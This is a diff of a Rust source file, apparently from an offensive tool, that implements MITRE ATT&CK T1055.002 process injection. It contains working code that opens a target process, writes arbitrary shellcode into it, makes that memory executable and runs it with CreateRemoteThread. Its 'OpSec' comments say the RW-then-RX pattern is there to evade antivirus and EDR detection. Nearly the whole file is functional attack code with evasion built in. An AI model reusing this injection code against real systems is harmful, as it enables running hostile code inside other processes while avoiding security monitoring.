@@ -1,9 +1,13 @@
-//! Implementation of MITRE ATT&CK T1055.002: Portable Executable Injection.
+//! Implementation of **MITRE ATT&CK T1055.002: Portable Executable Injection**.
 //!
-//! **Note:**
-//! While the T1055.002 technique specifically refers to PE injection, this
-//! implementation currently focuses on the injection of raw shellcode via
-//! `CreateRemoteThread`. This is a common primitive often used as a stage in full PE injection.
+//! This module implements the "Remote Thread" execution strategy. While the MITRE technique
+//! broadly refers to injecting PE files, this implementation acts as the low-level primitive
+//! that allocates memory and executes raw code (Shellcode) in a target process.
+//!
+//! # OpSec Note
+//! This implementation utilizes the **"Allocate -> Write -> Protect -> Execute"** pattern.
+//! It avoids allocating `RWX` (Read-Write-Execute) memory directly, which is a major
+//! heuristic used by Antivirus/EDR solutions to flag malicious behavior.
 
 use std::{
     mem::transmute,
@@ -27,76 +31,59 @@ use windows_sys::Win32::{
 };
 
 use crate::{
-    error::InjectumError,
-    info,
+    Error, Result, info,
     payload::Payload,
-    strategy::{Method, Strategy, Technique},
+    strategy::{PortableExecutable, Strategy, Technique},
     target::Target,
 };
 
-/// The strategy implementation for T1055.002 (Portable Executable Injection).
+/// The concrete strategy implementation for T1055.002.
+#[derive(Default)]
 pub struct T1055_002;
 
-/// Defines the supported sub-techniques for this strategy.
-#[derive(Debug, PartialEq)]
-enum InjectionMethod {
-    RemoteThreadInjection,
-}
-
-impl TryFrom<Method> for InjectionMethod {
-    type Error = InjectumError;
-
-    fn try_from(method: Method) -> Result<Self, Self::Error> {
-        match method.0 {
-            "RemoteThreadInjection" => Ok(Self::RemoteThreadInjection),
-            _ => Err(InjectumError::MethodNotSupported(method.0.to_string())),
-        }
-    }
-}
-
 impl Strategy for T1055_002 {
-    fn requires_pid(&self, method: Method) -> bool {
-        !matches!(method.0, "Self")
-    }
-
-    fn execute(
-        &self,
-        payload: &Payload,
-        target: &Target,
-        method: Method,
-    ) -> Result<(), InjectumError> {
-        let info = Technique::T1055_002.info();
+    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
+        let info = technique.info();
         info!("Strategy: {} ({})", info.mitre_id, info.name);
 
-        let variant: InjectionMethod = method.try_into()?;
+        let method = match technique {
+            Technique::T1055_002(m) => m,
+            _ => return Err(Error::Execution("Internal dispatch error".into())),
+        };
 
-        // 1. Validate Target (PID required)
-        let pid = target
-            .pid()
-            .ok_or(InjectumError::PidRequired(info.mitre_id))?;
-
-        // 2. Validate Payload
-        let shellcode = match payload {
-            Payload::Shellcode { bytes: b, .. } => b,
+        let process_id = match target {
+            Target::Pid(id) => *id,
             _ => {
-                return Err(InjectumError::PayloadMismatch {
+                return Err(Error::Validation(format!(
+                    "Strategy '{}' requires a Target PID.",
+                    info.mitre_id
+                )));
+            }
+        };
+
+        let shellcode = match payload {
+            Payload::Shellcode { bytes, .. } => bytes,
+            _ => {
+                return Err(Error::Mismatch {
                     strategy: info.mitre_id,
-                    payload_type: "Shellcode",
+                    variant: payload.variant_name(),
                 });
             }
         };
 
-        // 3. Execution based on variant
-        match variant {
-            InjectionMethod::RemoteThreadInjection => {
+        match method {
+            PortableExecutable::RemoteThread => {
                 info!("Method: Remote Thread Injection");
-                inject_remote_thread(pid, shellcode)
+                inject_remote_thread(process_id, shellcode)
             }
         }
     }
 }
 
-/// Wrapper to ensure handles are closed when they go out of scope.
+/// A RAII (Resource Acquisition Is Initialization) wrapper for Windows Handles.
+///
+/// Ensures that `CloseHandle` is automatically called when the scope ends,
+/// preventing resource leaks in the operating system.
 struct HandleGuard(HANDLE);
 
 impl HandleGuard {
@@ -113,9 +100,15 @@ impl Drop for HandleGuard {
     }
 }
 
-/// [Remote Thread Injection]
-/// Injects shellcode into a remote process and executes it via `CreateRemoteThread`.
-fn inject_remote_thread(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError> {
+/// Performs injection via the `CreateRemoteThread` API.
+///
+/// # Logic Flow
+/// 1. **OpenProcess**: Acquire handle to target.
+/// 2. **VirtualAllocEx**: Allocate memory as `PAGE_READWRITE` (RW).
+/// 3. **WriteProcessMemory**: Copy the shellcode into the allocated buffer.
+/// 4. **VirtualProtectEx**: Change memory protections to `PAGE_EXECUTE_READ` (RX).
+/// 5. **CreateRemoteThread**: Execute the shellcode in a new thread.
+fn inject_remote_thread(process_id: u32, shellcode: &[u8]) -> Result<()> {
     // 1. Open Target Process
     let process_handle = unsafe {
         OpenProcess(
@@ -125,22 +118,21 @@ fn inject_remote_thread(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError>
                 | PROCESS_VM_READ
                 | PROCESS_VM_WRITE,
             FALSE,
-            pid,
+            process_id,
         )
     };
 
     if process_handle.is_null() {
-        return Err(InjectumError::Win32Error("OpenProcess", unsafe {
-            GetLastError()
-        }));
+        return Err(Error::Win32("OpenProcess", unsafe { GetLastError() }));
     }
 
-    let process_handle_guard = HandleGuard::new(process_handle);
+    let process_guard = HandleGuard::new(process_handle);
 
     // 2. Allocate Memory RW (Read-Write)
-    let remote_buffer = unsafe {
+    // OpSec: We intentionally avoid PAGE_EXECUTE_READWRITE (RWX) to reduce detection surface.
+    let remote_addr = unsafe {
         VirtualAllocEx(
-            process_handle_guard.0,
+            process_guard.0,
             null(),
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
@@ -148,58 +140,57 @@ fn inject_remote_thread(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError>
         )
     };
 
-    if remote_buffer.is_null() {
-        return Err(InjectumError::Win32Error("VirtualAllocEx", unsafe {
-            GetLastError()
-        }));
+    if remote_addr.is_null() {
+        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
     }
 
     // 3. Write Shellcode to Target Memory
-    let mut bytes_written: usize = 0;
+    let mut write_len: usize = 0;
 
-    let write_success = unsafe {
+    let success = unsafe {
         WriteProcessMemory(
-            process_handle_guard.0,
-            remote_buffer,
+            process_guard.0,
+            remote_addr,
             shellcode.as_ptr().cast(),
             shellcode.len(),
-            &mut bytes_written,
+            &mut write_len,
         )
     };
 
-    if write_success == 0 || bytes_written != shellcode.len() {
-        return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
+    if success == 0 || write_len != shellcode.len() {
+        return Err(Error::Win32("WriteProcessMemory", unsafe {
             GetLastError()
         }));
     }
 
     // 4. Change Protection to RX (Execute-Read)
-    let mut old_protect: u32 = 0;
-    let protect_success = unsafe {
+    // Now that writing is done, we make it executable.
+    let mut old_protection: u32 = 0;
+
+    let success = unsafe {
         VirtualProtectEx(
-            process_handle_guard.0,
-            remote_buffer,
+            process_guard.0,
+            remote_addr,
             shellcode.len(),
             PAGE_EXECUTE_READ,
-            &mut old_protect,
+            &mut old_protection,
         )
     };
 
-    if protect_success == 0 {
-        return Err(InjectumError::Win32Error("VirtualProtectEx", unsafe {
-            GetLastError()
-        }));
+    if success == 0 {
+        return Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }));
     }
 
     // 5. Create Remote Thread
-    let start_routine: LPTHREAD_START_ROUTINE = unsafe { transmute(remote_buffer) };
+    // We cast the remote address to a function pointer type for the API call.
+    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(remote_addr) };
 
     let thread_handle = unsafe {
         CreateRemoteThread(
-            process_handle_guard.0,
+            process_guard.0,
             null(),
             0,
-            start_routine,
+            routine_ptr,
             null(),
             0,
             null_mut(),
@@ -207,7 +198,7 @@ fn inject_remote_thread(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError>
     };
 
     if thread_handle.is_null() {
-        return Err(InjectumError::Win32Error("CreateRemoteThread", unsafe {
+        return Err(Error::Win32("CreateRemoteThread", unsafe {
             GetLastError()
         }));
     }
